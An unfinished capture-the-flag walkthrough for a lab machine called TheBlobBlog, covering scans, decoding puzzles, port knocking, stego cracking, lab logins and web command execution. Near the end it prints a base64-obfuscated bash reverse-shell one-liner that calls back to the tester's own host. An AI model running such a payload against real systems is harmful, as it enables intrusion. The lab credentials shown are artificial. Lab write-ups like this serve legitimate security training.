---
layout: default
title: TheBlobBlog
status: incomplete
---

## TL;DR



### Recon

we start with `rustscan`, using this command:
```bash
rustscan -a $target -- -sV -sC -oN nmap.txt -oX nmap.xml
```

![rustscan results](image.png)

we can see port `22` with ssh, and port `80` with apache http server.
```bash
PORT   STATE SERVICE REASON         VERSION                                                                                            
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)                                    
| ssh-hostkey:                                                                                                                         
|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)                                                                         
| ssh-dss AAAAB3NzaC1kc3MAAACBALXivx0EdFUjWn8Hg9zVrEE0+FIVsz0Dgt27TYzwHsc2NBir/vuOaG2wuM28Yu1yY5yX8QyIT7QvvtGwpZMS9wGy0x+mjSzMVgkkUpMDp
2Yholkm9NH/CDhaA8zg3HxGd8/EdnHMLWszgF58xPCjUAtL3tZK09B4w/pdM0FFAF5BAAAAFQDzhIOaKK76v9eKeZNe0ZgkHVdyWQAAAIEAirSNjm02GVhgTbV6I60sZmY9nWOR
ouyVp+Y+K0MQF+Jvxr0QQEWFeIVNbYNW0eg06VJ0JLexGNttrT/N6LPU4KBR7zIGOshLhXV847rwkUjODCt0ZeLjUv0X8o6T4ExZi92VLBylxQmk2OMgUIyeVPVbAsDAK2N0LFW
HfpLTbl0AAACARqXryFKMWJQTJ1Ta5dX4bCZ20ulsATRbFuMLH1OZoA7gM2A2rijxPvK6Vp/VJt7701LhgI0dUZClMLC8q0OXaTEO3Ao6zdJb8W5snDue2TrPm12UnELgUD/NwW
VqyjgYq1UgZ+71l+3fy6Q8opDILH+RYmAypIXb29dXvICjC5U=                                                                                     
|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)                                                                         
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgOLGhQs3olTn9V7fF/VB8GkElTVbM33EOlppILeLZmIdeg0NkxZdScAjalP4AB/yiU/01Whysy6NhOeuyVfwRhCkvpoWkN1X20YI6fPdTE5TLOeR+m78IXXZlyBSj2GOqvM7tPr0BqvfpsoxkS4zXVYG4OhxZDR4/rmXA9GaSOTzGEOWj839sbW6cdos5nanQSdEhDM441+GeUfXfPh+nqasy422AEhDqFh6cDRcQw5MXR2pt+VicabIfcVjRNRCmNgpx3nbJ/u1TeNC8C40krEiH735AbPd/Bu/Hbg2hY0AR7I/2dwsZMMcQ6weRLY0bOdW8wWPTIgdWN65DVAlf
|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOdOqWQM/+hxmRNa9Np94ZyfIfPGqNPOMKRMQkwCUXxrEfrC6RxnuNQolldjaSZtTx4nd/qWQqcNvrFbifP942o=
|   256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJCjSR4Gytw2HNoqL4fDTKnxm0d8U/16kopRnicLqWMM
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's add `theblobblog.thm` to our `/etc/hosts`.

### ...

When I view the root page, we can see dafault apache http page:

![default](image-1.png)

However, in the source code there is some long comment hiding:

![comment](image-2.png)

This is this long base64 string
```bash
K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbLT4rKzxdPisuLVstPisrKys8XT4uLS1bLT4rKysrPF0+LS4tWy0+KysrPF0+LS4tLVstLS0+KzxdPi0tLitbLS0tLT4rPF0+KysrLlstPisrKzxdPisuLVstPisrKzxdPi4tWy0tLT4rKzxdPisuLS0uLS0tLS0uWy0+KysrPF0+Li0tLS0tLS0tLS0tLS4rWy0tLS0tPis8XT4uLS1bLS0tPis8XT4uLVstLS0tPis8XT4rKy4rK1stPisrKzxdPi4rKysrKysrKysrKysuLS0tLS0tLS0tLi0tLS0uKysrKysrKysrLi0tLS0tLS0tLS0uLS1bLS0tPis8XT4tLS0uK1stLS0tPis8XT4rKysuWy0+KysrPF0+Ky4rKysrKysrKysrKysrLi0tLS0tLS0tLS0uLVstLS0+KzxdPi0uKysrK1stPisrPF0+Ky4tWy0+KysrKzxdPi4tLVstPisrKys8XT4tLi0tLS0tLS0tLisrKysrKy4tLS0tLS0tLS0uLS0tLS0tLS0uLVstLS0+KzxdPi0uWy0+KysrPF0+Ky4rKysrKysrKysrKy4rKysrKysrKysrKy4tWy0+KysrPF0+LS4rWy0tLT4rPF0+KysrLi0tLS0tLS4rWy0tLS0+KzxdPisrKy4tWy0tLT4rKzxdPisuKysrLisuLS0tLS0tLS0tLS0tLisrKysrKysrLi1bKys+LS0tPF0+Ky4rKysrK1stPisrKzxdPi4tLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+LlstLS0+Kys8XT4tLS4rKysrK1stPisrKzxdPi4tLS0tLS0tLS0uWy0tLT4rPF0+LS0uKysrKytbLT4rKys8XT4uKysrKysrLi0tLS5bLS0+KysrKys8XT4rKysuK1stLS0tLT4rPF0+Ky4tLS0tLS0tLS0uKysrKy4tLS4rLi0tLS0tLS4rKysrKysrKysrKysrLisrKy4rLitbLS0tLT4rPF0+KysrLitbLT4rKys8XT4rLisrKysrKysrKysrLi4rKysuKy4rWysrPi0tLTxdPi4rK1stLS0+Kys8XT4uLlstPisrPF0+Ky5bLS0tPis8XT4rLisrKysrKysrKysrLi1bLT4rKys8XT4tLitbLS0tPis8XT4rKysuLS0tLS0tLitbLS0tLT4rPF0+KysrLi1bLS0tPisrPF0+LS0uKysrKysrKy4rKysrKysuLS0uKysrK1stPisrKzxdPi5bLS0tPis8XT4tLS0tLitbLS0tLT4rPF0+KysrLlstLT4rKys8XT4rLi0tLS0tLi0tLS0tLS0tLS0tLS4tLS1bLT4rKysrPF0+Li0tLS0tLS0tLS0tLS4tLS0uKysrKysrKysrLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+Li0tLS0tLS0uLS0tLS0tLS0tLS0tLi0tLVstPisrKys8XT4uLS0tLS0tLS0tLS0tLi0tLS4rKysrKysrKysuLVstPisrKysrPF0+LS4tLS0tLVstPisrPF0+LS4tLVstLS0+Kys8XT4tLg==
```

After decoding we get this snippet:
```bash
+[--->++<]>+.+++[->++++<]>.---.+++++++++.-[->+++++<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.-[->+++<]>-.--[--->+<]>--.+[---->+<]>+++.[->+++<]>+.-[->+++<]>.-[--->++<]>+.--.-----.[->+++<]>.------------.+[----->+<]>.--[--->+<]>.-[---->+<]>++.++[->+++<]>.++++++++++++.---------.----.+++++++++.----------.--[--->+<]>---.+[---->+<]>+++.[->+++<]>+.+++++++++++++.----------.-[--->+<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.--------.++++++.---------.--------.-[--->+<]>-.[->+++<]>+.+++++++++++.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>+.+++.+.------------.++++++++.-[++>---<]>+.+++++[->+++<]>.-.-[->+++++<]>-.++[-->+++<]>.[--->++<]>--.+++++[->+++<]>.---------.[--->+<]>--.+++++[->+++<]>.++++++.---.[-->+++++<]>+++.+[----->+<]>+.---------.++++.--.+.------.+++++++++++++.+++.+.+[---->+<]>+++.+[->+++<]>+.+++++++++++..+++.+.+[++>---<]>.++[--->++<]>..[->++<]>+.[--->+<]>+.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>--.+++++++.++++++.--.++++[->+++<]>.[--->+<]>----.+[---->+<]>+++.[-->+++<]>+.-----.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.++[-->+++<]>.-------.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.-----[->++<]>-.--[--->++<]>-.
```

It looks like `BrainFuck` code, let's execute it here [https://www.dcode.fr/brainfuck-language](https://www.dcode.fr/brainfuck-language) 

![execte brainfuck](image-3.png)

This is the output we get:
```bash
When I was a kid, my friends and I would always knock on 3 of our neighbors doors.  Always houses 1, then 3, then 5!
```

Maybe there is some sort of port knocking? 

In addition, at the bottom of the page I found also this comment:
```html
<!--
Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is: 
HcfP8J54AK4
-->
```

I tried to decode it using CyberChef, base58, and find the string, which is:
```bash
cUpC4k3s
```

![decode password](image-4.png)

Anyway, I tried to knock the ports and do ports scan again:
```bash
┌──(agonen㉿kali)-[~/thm/TheBlobBlog]
└─$ knock theblobblog.thm 1 3 5 -v   
hitting tcp 10.66.134.97:1
hitting tcp 10.66.134.97:3
hitting tcp 10.66.134.97:5
```

and now port scan again:

![new rustscan](image-5.png)

we can see more ports this time, port `21` with ftp, port `445` with apache http server and port `8080` with werkzeug http server.
```bash
PORT     STATE SERVICE REASON         VERSION                                                                                                                                                                     
21/tcp   open  ftp     syn-ack ttl 62 vsftpd 3.0.2                                                                                                                                                                
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)                                                                                                             
| ssh-hostkey:                                                                                                                                                                                                    
|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)                                                                                                                                                    
| ssh-dss AAAAB3NzaC1kc3MAAACBALXivx0EdFUjWn8Hg9zVrEE0+FIVsz0Dgt27TYzwHsc2NBir/vuOaG2wuM28Yu1yY5yX8QyIT7QvvtGwpZMS9wGy0x+mjSzMVgkkUpMDp2Yholkm9NH/CDhaA8zg3HxGd8/EdnHMLWszgF58xPCjUAtL3tZK09B4w/pdM0FFAF5BAAAAFQDz
hIOaKK76v9eKeZNe0ZgkHVdyWQAAAIEAirSNjm02GVhgTbV6I60sZmY9nWORouyVp+Y+K0MQF+Jvxr0QQEWFeIVNbYNW0eg06VJ0JLexGNttrT/N6LPU4KBR7zIGOshLhXV847rwkUjODCt0ZeLjUv0X8o6T4ExZi92VLBylxQmk2OMgUIyeVPVbAsDAK2N0LFWHfpLTbl0AAACARq
XryFKMWJQTJ1Ta5dX4bCZ20ulsATRbFuMLH1OZoA7gM2A2rijxPvK6Vp/VJt7701LhgI0dUZClMLC8q0OXaTEO3Ao6zdJb8W5snDue2TrPm12UnELgUD/NwWVqyjgYq1UgZ+71l+3fy6Q8opDILH+RYmAypIXb29dXvICjC5U=                                        
|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)                                                                                                                                                    
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgOLGhQs3olTn9V7fF/VB8GkElTVbM33EOlppILeLZmIdeg0NkxZdScAjalP4AB/yiU/01Whysy6NhOeuyVfwRhCkvpoWkN1X20YI6fPdTE5TLOeR+m78IXXZlyBSj2GOqvM7tPr0BqvfpsoxkS4zXVYG4OhxZDR4/rmXA9GaS
OTzGEOWj839sbW6cdos5nanQSdEhDM441+GeUfXfPh+nqasy422AEhDqFh6cDRcQw5MXR2pt+VicabIfcVjRNRCmNgpx3nbJ/u1TeNC8C40krEiH735AbPd/Bu/Hbg2hY0AR7I/2dwsZMMcQ6weRLY0bOdW8wWPTIgdWN65DVAlf                                      
|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)                                                                                                                                                   
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOdOqWQM/+hxmRNa9Np94ZyfIfPGqNPOMKRMQkwCUXxrEfrC6RxnuNQolldjaSZtTx4nd/qWQqcNvrFbifP942o=
|   256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)                                                                                            
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJCjSR4Gytw2HNoqL4fDTKnxm0d8U/16kopRnicLqWMM                                                                           
80/tcp   open  http    syn-ack ttl 62 Apache httpd 2.4.7 ((Ubuntu))                                                                                          
|_http-server-header: Apache/2.4.7 (Ubuntu)                                                                                                                  
|_http-title: Apache2 Ubuntu Default Page: It works                                                                                                          
| http-methods:                                                                                                                                              
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                 
445/tcp  open  http    syn-ack ttl 62 Apache httpd 2.4.7 ((Ubuntu))                                                                                          
|_http-server-header: Apache/2.4.7 (Ubuntu)                                                                                                                  
| http-methods:                                                                                                                                              
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                 
|_http-title: Apache2 Ubuntu Default Page: It works                                                                                                          
8080/tcp open  http    syn-ack ttl 62 Werkzeug httpd 1.0.1 (Python 3.5.3)                                                                                    
| http-methods:                                                                                                                                              
|_  Supported Methods: HEAD GET OPTIONS                                                                                                                      
|_http-server-header: Werkzeug/1.0.1 Python/3.5.3                                                                                                            
|_http-title: Apache2 Ubuntu Default Page: It works                                                                                                          
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                                                                               
                                                                                                                                                             
Host script results:                                                                                                                   
|_smb2-time: Protocol negotiation failed (SMB2)                                                                                        
| p2p-conficker:                                                                                                                       
|   Checking for Conficker.C or higher...                                                                                              
|   Check 1 (port 64343/tcp): CLEAN (Couldn't connect)                                                                                 
|   Check 2 (port 34028/tcp): CLEAN (Couldn't connect)                                                                                 
|   Check 3 (port 23635/udp): CLEAN (Timeout)                                                                                          
|   Check 4 (port 7448/udp): CLEAN (Timeout)                                                                                           
|_  0/4 checks are positive: Host is CLEAN or ports are blocked                                                                        
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
```

First I logged in to the ftp service, with the password we found before:
```bash
┌──(agonen㉿kali)-[~/thm/TheBlobBlog]
└─$ ftp bob@theblobblog.thm       
Connected to theblobblog.thm.
220 (vsFTPd 3.0.2)
331 Please specify the password.
Password:  # password is cUpC4k3s  
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

I downloaded all files using this command:
```bash
wget -m ftp://bob@theblobblog.thm/ --password cUpC4k3s
```

inside `ftp/files` we can find the file `cool.jpeg`, which is this image.

![cool](image-6.png)

It hides some secret, I cracked it:
```bash
┌──(agonen㉿kali)-[~/…/TheBlobBlog/theblobblog.thm/ftp/files]
└─$ steghide --info cool.jpeg                           
"cool.jpeg":
  format: jpeg
  capacity: 423.0 Byte
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                                                                                                                                                                  
┌──(agonen㉿kali)-[~/…/TheBlobBlog/theblobblog.thm/ftp/files]
└─$ stegseek cool.jpeg -wl /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "p@55w0rd"         
[i] Original filename: "out.txt".
[i] Extracting to "cool.jpeg.out".
```

and this is the secret we gets:
```bash
┌──(agonen㉿kali)-[~/…/TheBlobBlog/theblobblog.thm/ftp/files]
└─$ cat cool.jpeg.out   
zcv:p1fd3v3amT@55n0pr
/bobs_safe_for_stuff
```

![secret](image-7.png)

I executed `ffuf` on the http server on port `80` and found some endpoints:
```bash
┌──(agonen㉿kali)-[~/thm/TheBlobBlog]                                                                                                                        
└─$ ffuf -u "http://theblobblog.thm:8080/FUZZ" -w /usr/share/SecLists/Discovery/Web-Content/common.txt -fc 403                                               
                                                                                                                                                             
        /'___\  /'___\           /'___\                                                                                                                      
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                      
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                     
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                     
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                      
          \/_/    \/_/   \/___/    \/_/                                                                                                                      
                                                                                                                                                             
       v2.1.0-dev                                                                                                                                            
________________________________________________                                                                                                             
                                                                                                                                                             
 :: Method           : GET                                                                                                                                   
 :: URL              : http://theblobblog.thm:8080/FUZZ                                                                                                      
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/common.txt                                                                            
 :: Follow redirects : false                                                                                                                                 
 :: Calibration      : false                                                  
 :: Timeout          : 10                                                     
 :: Threads          : 40                                                     
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500                                                                                  
 :: Filter           : Response status: 403                                   
________________________________________________                              

blog                    [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 179ms]                                                                       
login                   [Status: 200, Size: 546, Words: 24, Lines: 18, Duration: 272ms]                                                                      
review                  [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 169ms]                                                                       
:: Progress: [4750/4750] :: Job [1/1] :: 115 req/sec :: Duration: [0:00:40] :: Errors: 0 ::
```

I went to `blog`, and it redirect me to `login`, where we can see this simple portal.

![login](image-8.png)

however, the credentials didn't work on this login page.

So, I moved to enumearte port `445`, we can see the hidden path `/bobs_safe_for_stuff` can be accessed here
```bash
Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
- youmayenter
```

![445](image-9.png)

I fuzzed port `445` and found the endpoint `user`:
```bash
┌──(agonen㉿kali)-[~/thm/TheBlobBlog]
└─$ ffuf -u "http://theblobblog.thm:445/FUZZ" -w /usr/share/SecLists/Discovery/Web-Content/common.txt -fc 403                                  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://theblobblog.thm:445/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

index.html              [Status: 200, Size: 11596, Words: 3539, Lines: 383, Duration: 159ms]
user                    [Status: 200, Size: 3401, Words: 7, Lines: 50, Duration: 239ms]
:: Progress: [4750/4750] :: Job [1/1] :: 242 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```

It containes some private key:

![user](image-10.png)

I tried to use the private key we found here, but it always returns error:
```bash
HTTP/1.1 200 OK
Date: Fri, 19 Dec 2025 12:42:29 GMT
Server: Apache/2.4.7 (Ubuntu)
Last-Modified: Thu, 06 Aug 2020 18:45:52 GMT
ETag: "d49-5ac39e5cc18b3"
Accept-Ranges: bytes
Content-Length: 3401
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

![error private key](image-12.png)

Next, remember the note before, maybe `youmayenter` is a key. I tried with vigener cipher using CyberChef to decrpt the string `zcv:p1fd3v3amT@55n0pr`, and i got back:
```bash
bob:d1ff3r3ntP@55w0rd
```

![vigenere](image-11.png)

I managed to login with the credentials to `http://theblobblog.thm:8080/login`

![login](image-13.png)

I simply executed `id` and it gave me `RCE`, probably execute `eval` behind the scence, like php.

![id](image-14.png)

and we got command exection.

![RCE](image-15.png)

Just paste the payload from penelope
```bash
printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC4xNjQuMjQ4LzQ0NDQgMD4mMSkgJg==|base64 -d|bash
```

and take our reverse shell

![reverse shell](image-16.png)

### ...

need to find user flag and root flag.

### Privilege Escalation to Root


